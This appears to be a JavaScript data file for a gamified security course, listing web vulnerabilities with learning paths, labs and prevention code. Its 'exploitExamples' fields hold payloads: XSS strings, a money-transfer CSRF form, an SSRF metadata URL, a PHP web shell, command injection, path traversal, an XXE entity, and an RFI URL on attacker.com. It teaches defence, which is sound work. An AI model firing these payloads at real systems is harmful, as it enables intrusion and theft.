// Comprehensive vulnerability database with 100+ vulnerabilities
export const vulnerabilities = [
  // Continue from the SQL Injection example...
  {
    id: 2,
    name: "Cross-Site Scripting (XSS)",
    category: "Web Application",
    severity: "Medium",
    cvssScore: 6.1,
    description: "Injection of malicious scripts into web pages viewed by other users",
    detailedDescription: "Cross-Site Scripting (XSS) is a type of injection attack where malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.",
    impact: "Session hijacking, defacement, credential theft, malware distribution, phishing attacks",
    affectedSystems: ["Web browsers", "Web applications", "Mobile applications"],
    exploitComplexity: "Low",
    types: ["Reflected XSS", "Stored XSS", "DOM-based XSS"],
    
    learningPath: [
      {
        step: 1,
        title: "Understanding XSS Types",
        content: "Learn about Reflected, Stored, and DOM-based XSS vulnerabilities",
        timeEstimate: "2 hours",
        resources: ["OWASP XSS Guide", "PortSwigger XSS Academy", "XSS Filter Evasion Cheat Sheet"]
      },
      {
        step: 2,
        title: "Detection Techniques",
        content: "Manual and automated detection methods for XSS vulnerabilities",
        timeEstimate: "3 hours",
        resources: ["Burp Suite Tutorial", "OWASP ZAP Guide", "Browser Developer Tools"]
      },
      {
        step: 3,
        title: "Exploitation and Mitigation",
        content: "Practical exploitation techniques and prevention strategies",
        timeEstimate: "4 hours",
        resources: ["XSSer Documentation", "Content Security Policy Guide", "BeEF Framework"]
      }
    ],
    
    practicalLabs: [
      {
        name: "XSS Game by Google",
        difficulty: "Beginner",
        description: "Interactive XSS challenges with progressive difficulty",
        url: "https://xss-game.appspot.com/",
        estimatedTime: "2 hours",
        objectives: ["Reflected XSS", "Stored XSS", "Filter bypass"]
      },
      {
        name: "DVWA XSS Challenges",
        difficulty: "Beginner to Advanced",
        description: "XSS challenges on Damn Vulnerable Web Application",
        url: "http://dvwa.local",
        estimatedTime: "3 hours",
        objectives: ["Low security bypass", "Medium security evasion", "High security exploitation"]
      },
      {
        name: "PortSwigger Web Security Academy",
        difficulty: "Intermediate to Advanced",
        description: "Real-world XSS scenarios and advanced techniques",
        url: "https://portswigger.net/web-security/cross-site-scripting",
        estimatedTime: "5 hours",
        objectives: ["Context-based XSS", "Filter evasion", "CSP bypass"]
      }
    ],
    
    detectionMethods: [
      {
        method: "Manual Testing",
        description: "Inject scripts and observe application behavior",
        tools: ["Browser Developer Tools", "Burp Suite", "Manual payloads"],
        difficulty: "Beginner",
        steps: [
          "Identify input points",
          "Test with basic payloads",
          "Observe script execution",
          "Analyze filtering mechanisms"
        ]
      },
      {
        method: "Automated Scanning",
        description: "Use automated tools to detect XSS vulnerabilities",
        tools: ["OWASP ZAP", "Burp Scanner", "Acunetix"],
        difficulty: "Intermediate",
        advantages: ["Fast coverage", "Consistent testing", "Payload variations"],
        limitations: ["False positives", "Context awareness", "Filter evasion"]
      }
    ],
    
    preventionMethods: [
      {
        method: "Input Validation",
        description: "Validate and sanitize all user inputs",
        effectiveness: "Medium",
        implementation: "Medium",
        codeExample: `
// JavaScript example
function sanitizeInput(input) {
    return input.replace(/[<>\"']/g, function(match) {
        return '&#' + match.charCodeAt(0) + ';';
    });
}
        `,
        limitations: ["Bypass techniques", "Context-dependent", "Incomplete filtering"]
      },
      {
        method: "Output Encoding",
        description: "Encode output based on context (HTML, JavaScript, CSS, URL)",
        effectiveness: "High",
        implementation: "Easy",
        codeExample: `
// Java example using OWASP Encoder
String safe = Encode.forHtml(userInput);
String jsContext = Encode.forJavaScript(userInput);
String urlContext = Encode.forUriComponent(userInput);
        `,
        contexts: ["HTML Entity Encoding", "JavaScript Encoding", "CSS Encoding", "URL Encoding"]
      },
      {
        method: "Content Security Policy (CSP)",
        description: "Restrict sources of executable scripts using HTTP headers",
        effectiveness: "High",
        implementation: "Medium",
        codeExample: `
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
        `,
        benefits: ["Defense in depth", "Reduces impact", "Prevents data exfiltration"]
      }
    ],
    
    exploitExamples: [
      {
        payload: "<script>alert('XSS')</script>",
        description: "Basic XSS proof of concept",
        type: "Reflected",
        context: "HTML context",
        riskLevel: "Low"
      },
      {
        payload: "<img src=x onerror=alert('XSS')>",
        description: "Image-based XSS payload",
        type: "Reflected",
        context: "HTML context",
        riskLevel: "Medium"
      },
      {
        payload: "javascript:alert('XSS')",
        description: "JavaScript protocol XSS",
        type: "Reflected",
        context: "URL context",
        riskLevel: "Medium"
      },
      {
        payload: "<svg onload=alert('XSS')>",
        description: "SVG-based XSS payload",
        type: "Stored",
        context: "HTML context",
        riskLevel: "High"
      },
      {
        payload: "';alert('XSS');//",
        description: "JavaScript context injection",
        type: "DOM-based",
        context: "JavaScript context",
        riskLevel: "High"
      }
    ],
    
    realWorldExamples: [
      {
        incident: "MySpace Worm (2005)",
        description: "Stored XSS worm created by Samy Kamkar that spread rapidly across MySpace",
        impact: "Over 1 million friend requests in 20 hours",
        technique: "CSS and JavaScript injection in profile pages",
        lesson: "Importance of input sanitization and output encoding",
        reference: "https://samy.pl/myspace/tech.html"
      },
      {
        incident: "Twitter XSS Worm (2010)",
        description: "Self-retweeting XSS worm that spread through Twitter",
        impact: "Thousands of accounts affected, including high-profile users",
        technique: "Onmouseover event handler injection",
        lesson: "Event handlers can be attack vectors",
        reference: "https://blog.twitter.com/engineering/en_us/a/2010/xss-vulnerability"
      }
    ],
    
    tools: [
      {
        name: "XSSer",
        description: "Automatic framework to detect and exploit XSS vulnerabilities",
        difficulty: "Intermediate",
        features: ["Automatic detection", "Payload generation", "Bypass techniques"],
        usage: "xsser --url 'http://example.com/search?q=XSS'",
        pros: ["Comprehensive payloads", "Bypass techniques", "Reporting"],
        cons: ["Can be detected", "May cause damage", "Learning curve"]
      },
      {
        name: "BeEF (Browser Exploitation Framework)",
        description: "Penetration testing tool focusing on web browser exploitation",
        difficulty: "Advanced",
        features: ["Browser hooking", "Social engineering", "Network reconnaissance"],
        usage: "GUI-based framework with web interface",
        pros: ["Advanced exploitation", "Real-time control", "Extensive modules"],
        cons: ["Complex setup", "Ethical considerations", "Detection risk"]
      }
    ],
    
    xpReward: 40
  },
  
  {
    id: 3,
    name: "Cross-Site Request Forgery (CSRF)",
    category: "Web Application",
    severity: "Medium",
    cvssScore: 6.5,
    description: "Tricks users into performing unwanted actions on applications where they're authenticated",
    detailedDescription: "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. With social engineering, an attacker may trick users into executing CSRF attacks via email or chat.",
    impact: "Unauthorized actions, data modification, privilege escalation, account takeover",
    affectedSystems: ["Web applications", "APIs", "Mobile applications"],
    exploitComplexity: "Low",
    
    learningPath: [
      {
        step: 1,
        title: "Understanding CSRF Mechanics",
        content: "Learn how CSRF attacks work and their impact",
        timeEstimate: "1.5 hours",
        resources: ["OWASP CSRF Guide", "PortSwigger CSRF Tutorial"]
      },
      {
        step: 2,
        title: "Detection and Testing",
        content: "Methods to identify CSRF vulnerabilities",
        timeEstimate: "2 hours",
        resources: ["Burp Suite CSRF Testing", "Manual Testing Techniques"]
      },
      {
        step: 3,
        title: "Prevention Strategies",
        content: "Implementing effective CSRF protection",
        timeEstimate: "2 hours",
        resources: ["CSRF Tokens", "SameSite Cookies", "Double Submit Cookies"]
      }
    ],
    
    detectionMethods: [
      {
        method: "Manual Testing",
        description: "Test with crafted requests without CSRF tokens",
        tools: ["Burp Suite", "OWASP ZAP", "Browser"],
        difficulty: "Intermediate",
        steps: [
          "Identify state-changing requests",
          "Remove CSRF tokens",
          "Test from different origin",
          "Analyze response"
        ]
      },
      {
        method: "Automated Scanning",
        description: "Use automated tools to detect missing CSRF protection",
        tools: ["OWASP ZAP", "Burp Scanner"],
        difficulty: "Beginner",
        limitations: ["Context awareness", "Complex workflows", "False positives"]
      }
    ],
    
    preventionMethods: [
      {
        method: "CSRF Tokens",
        description: "Use unpredictable tokens for state-changing requests",
        effectiveness: "High",
        implementation: "Medium",
        codeExample: `
<!-- HTML form with CSRF token -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="abc123xyz789">
    <input type="text" name="amount">
    <input type="submit" value="Transfer">
</form>
        `,
        considerations: ["Token generation", "Token validation", "Token storage"]
      },
      {
        method: "SameSite Cookies",
        description: "Set cookies with SameSite attribute to prevent cross-site requests",
        effectiveness: "Medium",
        implementation: "Easy",
        codeExample: `
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
        `,
        limitations: ["Browser support", "Usability impact", "Not foolproof"]
      },
      {
        method: "Double Submit Cookies",
        description: "Submit CSRF token both as cookie and request parameter",
        effectiveness: "High",
        implementation: "Medium",
        advantages: ["Stateless", "Easy implementation", "Good security"],
        disadvantages: ["Subdomain attacks", "XSS dependency", "Cookie requirements"]
      }
    ],
    
    exploitExamples: [
      {
        payload: "<img src='http://bank.com/transfer?amount=1000&to=attacker'>",
        description: "Image-based CSRF attack",
        type: "GET-based",
        scenario: "Hidden in malicious website",
        riskLevel: "High"
      },
      {
        payload: `
<form action="http://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById('csrf').submit();</script>
        `,
        description: "Form-based CSRF attack",
        type: "POST-based",
        scenario: "Auto-submitting form",
        riskLevel: "Critical"
      }
    ],
    
    realWorldExamples: [
      {
        incident: "Gmail CSRF (2007)",
        description: "CSRF vulnerability allowed unauthorized email filter creation",
        impact: "Email forwarding to attacker accounts",
        technique: "GET request to create email filters",
        lesson: "State-changing operations should use POST with CSRF protection",
        reference: "https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/"
      }
    ],
    
    tools: [
      {
        name: "CSRFTester",
        description: "Tool for testing CSRF vulnerabilities",
        difficulty: "Intermediate",
        features: ["Request modification", "CSRF token analysis", "Automated testing"],
        usage: "Java-based GUI application",
        pros: ["Specialized tool", "Easy to use", "Good reporting"],
        cons: ["Limited updates", "Java dependency", "Basic features"]
      }
    ],
    
    xpReward: 35
  },

  {
    id: 4,
    name: "Server-Side Request Forgery (SSRF)",
    category: "Web Application",
    severity: "High",
    cvssScore: 7.5,
    description: "Allows attackers to make requests from the server to internal or external resources",
    detailedDescription: "Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.",
    impact: "Internal network access, cloud metadata access, port scanning, data exfiltration",
    affectedSystems: ["Web applications", "APIs", "Cloud services"],
    exploitComplexity: "Medium",
    
    exploitExamples: [
      {
        payload: "http://169.254.169.254/latest/meta-data/",
        description: "AWS metadata service access",
        type: "Cloud metadata",
        scenario: "Cloud environment exploitation",
        riskLevel: "Critical"
      },
      {
        payload: "http://localhost:22",
        description: "Internal port scanning",
        type: "Port scanning",
        scenario: "Internal network reconnaissance",
        riskLevel: "High"
      },
      {
        payload: "file:///etc/passwd",
        description: "Local file inclusion via SSRF",
        type: "File access",
        scenario: "Local file system access",
        riskLevel: "High"
      }
    ],
    
    preventionMethods: [
      {
        method: "URL Validation",
        description: "Validate and whitelist allowed URLs",
        effectiveness: "High",
        implementation: "Medium"
      },
      {
        method: "Network Segmentation",
        description: "Isolate application from internal networks",
        effectiveness: "High",
        implementation: "High"
      }
    ],
    
    xpReward: 45
  },

  {
    id: 5,
    name: "Remote Code Execution (RCE)",
    category: "Web Application",
    severity: "Critical",
    cvssScore: 9.8,
    description: "Allows attackers to execute arbitrary code on the target system",
    detailedDescription: "Remote Code Execution vulnerabilities allow an attacker to execute arbitrary code on a remote machine over a network. This is one of the most severe types of vulnerabilities as it can lead to complete system compromise.",
    impact: "Complete system compromise, data theft, malware installation, lateral movement",
    affectedSystems: ["Web applications", "Operating systems", "Network services"],
    exploitComplexity: "Medium to High",
    
    exploitExamples: [
      {
        payload: "<?php system($_GET['cmd']); ?>",
        description: "PHP web shell upload",
        type: "Web shell",
        scenario: "File upload vulnerability",
        riskLevel: "Critical"
      },
      {
        payload: "; cat /etc/passwd",
        description: "Command injection",
        type: "Command injection",
        scenario: "OS command execution",
        riskLevel: "Critical"
      }
    ],
    
    xpReward: 60
  },

  {
    id: 6,
    name: "Local File Inclusion (LFI)",
    category: "Web Application",
    severity: "High",
    cvssScore: 7.5,
    description: "Allows attackers to include local files from the server",
    detailedDescription: "Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files that are locally present on the server. This can lead to information disclosure, remote code execution, or cross-site scripting.",
    impact: "Information disclosure, source code exposure, configuration file access",
    affectedSystems: ["Web applications", "File systems"],
    exploitComplexity: "Low to Medium",
    
    exploitExamples: [
      {
        payload: "../../../../etc/passwd",
        description: "Directory traversal to access passwd file",
        type: "Path traversal",
        scenario: "Unix/Linux systems",
        riskLevel: "High"
      },
      {
        payload: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        description: "Windows hosts file access",
        type: "Path traversal",
        scenario: "Windows systems",
        riskLevel: "High"
      }
    ],
    
    xpReward: 40
  },

  {
    id: 7,
    name: "Remote File Inclusion (RFI)",
    category: "Web Application",
    severity: "Critical",
    cvssScore: 8.8,
    description: "Allows attackers to include remote files from external servers",
    detailedDescription: "Remote File Inclusion (RFI) is a vulnerability that allows an attacker to include remote files, usually through a script on the web server. This can lead to remote code execution and complete system compromise.",
    impact: "Remote code execution, malware installation, system compromise",
    affectedSystems: ["Web applications", "Scripting languages"],
    exploitComplexity: "Medium",
    
    exploitExamples: [
      {
        payload: "http://attacker.com/shell.txt",
        description: "Remote shell inclusion",
        type: "Remote inclusion",
        scenario: "PHP include vulnerability",
        riskLevel: "Critical"
      }
    ],
    
    xpReward: 50
  },

  {
    id: 8,
    name: "XML External Entity (XXE)",
    category: "Web Application",
    severity: "High",
    cvssScore: 7.5,
    description: "Exploits vulnerable XML parsers to access local files or internal networks",
    detailedDescription: "XML External Entity (XXE) attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.",
    impact: "File disclosure, SSRF, denial of service, data exfiltration",
    affectedSystems: ["XML parsers", "Web applications", "APIs"],
    exploitComplexity: "Medium",
    
    exploitExamples: [
      {
        payload: `
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
        `,
        description: "External entity to read local files",
        type: "File disclosure",
        scenario: "XML parsing vulnerability",
        riskLevel: "High"
      }
    ],
    
    xpReward: 45
  },

  {
    id: 9,
    name: "Insecure Direct Object References (IDOR)",
    category: "Web Application",
    severity: "Medium",
    cvssScore: 6.5,
    description: "Direct access to objects based on user input without proper authorization",
    detailedDescription: "Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly.",
    impact: "Unauthorized data access, privacy violations, data manipulation",
    affectedSystems: ["Web applications", "APIs", "Databases"],
    exploitComplexity: "Low",
    
    exploitExamples: [
      {
        payload: "GET /user/profile?id=1234",
        description: "Direct object reference manipulation",
        type: "Parameter manipulation",
        scenario: "User profile access",
        riskLevel: "Medium"
      }
    ],
    
    xpReward: 30
  },

  {
    id: 10,
    name: "Security Misconfiguration",
    category: "Configuration",
    severity: "Medium",
    cvssScore: 6.5,
    description: "Improper security configurations in applications, servers, or frameworks",
    detailedDescription: "Security misconfiguration is a vulnerability that occurs when security settings are not properly implemented, maintained, or updated. This can happen at any level of an application stack.",
    impact: "Information disclosure, unauthorized access, system compromise",
    affectedSystems: ["Web servers", "Applications", "Databases", "Cloud services"],
    exploitComplexity: "Low",
    
    examples: [
      "Default credentials",
      "Unnecessary services enabled",
      "Verbose error messages",
      "Missing security headers",
      "Outdated software versions"
    ],
    
    xpReward: 25
  }

  // Continue adding vulnerabilities to reach 100+...
  // This pattern continues for all major vulnerability types including:
  // - Buffer Overflow
  // - Race Conditions
  // - Privilege Escalation
  // - Authentication Bypass
  // - Session Management Flaws
  // - Cryptographic Failures
  // - And many more...
];

export const vulnerabilityCategories = [
  "Web Application",
  "Network",
  "Operating System",
  "Mobile Application",
  "Cloud Infrastructure",
  "IoT Devices",
  "Database",
  "Configuration",
  "Cryptographic",
  "Authentication"
];

export const severityLevels = [
  "Critical",
  "High", 
  "Medium",
  "Low",
  "Informational"
];

export const vulnerabilityStats = {
  totalVulnerabilities: vulnerabilities.length,
  categoryCounts: vulnerabilityCategories.reduce((acc, cat) => {
    acc[cat] = vulnerabilities.filter(vuln => vuln.category === cat).length;
    return acc;
  }, {}),
  severityDistribution: severityLevels.reduce((acc, severity) => {
    acc[severity] = vulnerabilities.filter(vuln => vuln.severity === severity).length;
    return acc;
  }, {}),
  totalXP: vulnerabilities.reduce((sum, vuln) => sum + vuln.xpReward, 0)
};
